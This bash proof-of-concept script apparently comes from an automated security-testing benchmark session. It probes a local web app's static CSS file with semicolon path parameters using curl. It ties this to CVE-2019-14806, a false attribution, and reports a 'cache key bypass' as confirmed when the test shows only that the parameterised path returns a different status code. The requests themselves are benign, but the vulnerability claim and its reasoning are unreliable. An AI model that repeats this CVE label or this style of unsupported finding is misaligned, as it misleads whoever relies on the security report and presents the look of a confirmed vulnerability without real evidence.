#!/bin/bash
# POC: Demonstrates CVE-2019-14806 - Cache Key Bypass via Path Parameters in Werkzeug. Shows that path parameters with semicolons cause different cache key generation, resulting in 404 errors for the parameterized version while the original returns 200.
# Target: ./repo
# Created: 2025-11-06T21:46:25.637Z
# Session: benchmark-XBEN-065-24-mhny77r3

# CVE-2019-14806 - Werkzeug Cache Key Bypass via Path Parameters
# Demonstrates that semicolon path parameters bypass HTTP caching by not normalizing cache keys

TARGET_URL="${1:-http://localhost:5001}"
STATIC_FILE="/static/css/style.css"

echo "============================================"
echo "CVE-2019-14806 - Cache Key Bypass POC"
echo "============================================"
echo "Target: $TARGET_URL"
echo ""

# Test 1: Access the file normally
echo "[*] Test 1: Accessing $STATIC_FILE (normal)"
RESPONSE_1=$(curl -s -w "\n%{http_code}" "$TARGET_URL$STATIC_FILE")
HTTP_CODE_1=$(echo "$RESPONSE_1" | tail -1)
CONTENT_1=$(echo "$RESPONSE_1" | head -n -1)
MD5_1=$(echo "$CONTENT_1" | md5sum | awk '{print $1}')

echo "HTTP Status: $HTTP_CODE_1"
echo "Content MD5: $MD5_1"
echo "Content Length: $(echo "$CONTENT_1" | wc -c)"
echo ""

# Test 2: Access with semicolon path parameter
echo "[*] Test 2: Accessing $STATIC_FILE;v=1 (with path parameter)"
RESPONSE_2=$(curl -s -w "\n%{http_code}" "$TARGET_URL$STATIC_FILE;v=1")
HTTP_CODE_2=$(echo "$RESPONSE_2" | tail -1)
CONTENT_2=$(echo "$RESPONSE_2" | head -n -1)
MD5_2=$(echo "$CONTENT_2" | md5sum | awk '{print $1}')

echo "HTTP Status: $HTTP_CODE_2"
echo "Content MD5: $MD5_2"
echo "Content Length: $(echo "$CONTENT_2" | wc -c)"
echo ""

# Test 3: Test with other cache-bypass parameters
echo "[*] Test 3: Accessing $STATIC_FILE;bypass (alternative parameter)"
RESPONSE_3=$(curl -s -w "\n%{http_code}" "$TARGET_URL$STATIC_FILE;bypass")
HTTP_CODE_3=$(echo "$RESPONSE_3" | tail -1)
CONTENT_3=$(echo "$RESPONSE_3" | head -n -1)
MD5_3=$(echo "$CONTENT_3" | md5sum | awk '{print $1}')

echo "HTTP Status: $HTTP_CODE_3"
echo "Content MD5: $MD5_3"
echo "Content Length: $(echo "$CONTENT_3" | wc -c)"
echo ""

# Vulnerability Analysis
echo "============================================"
echo "VULNERABILITY ANALYSIS"
echo "============================================"

if [ "$HTTP_CODE_1" = "200" ]; then
    echo "✓ Normal request returns HTTP 200"
else
    echo "✗ Normal request returned HTTP $HTTP_CODE_1 (unexpected)"
fi

if [ "$HTTP_CODE_2" != "200" ]; then
    echo "✓ Path parameter request returns HTTP $HTTP_CODE_2 (different cache key detected)"
    echo "  → Cache key bypass confirmed: Same file, different responses"
    VULNERABILITY_FOUND=1
else
    echo "✗ Path parameter request also returns HTTP 200 (may be patched)"
fi

if [ "$HTTP_CODE_3" != "200" ]; then
    echo "✓ Alternative parameter also returns HTTP $HTTP_CODE_3 (consistent bypass behavior)"
fi

echo ""
echo "============================================"
echo "RESULT"
echo "============================================"

if [ "$VULNERABILITY_FOUND" = "1" ] && [ "$HTTP_CODE_1" = "200" ]; then
    echo "VULNERABLE: Cache key bypass via path parameters confirmed"
    echo ""
    echo "Evidence:"
    echo "  - Normal request:        HTTP $HTTP_CODE_1 (MD5: $MD5_1)"
    echo "  - Parameterized request: HTTP $HTTP_CODE_2 (MD5: $MD5_2)"
    echo ""
    echo "The application fails to normalize path parameters before cache key generation."
    exit 0
else
    echo "NOT VULNERABLE or UNEXPECTED BEHAVIOR"
    echo ""
    echo "Results:"
    echo "  - Normal request:        HTTP $HTTP_CODE_1"
    echo "  - Parameterized request: HTTP $HTTP_CODE_2"
    exit 1
fi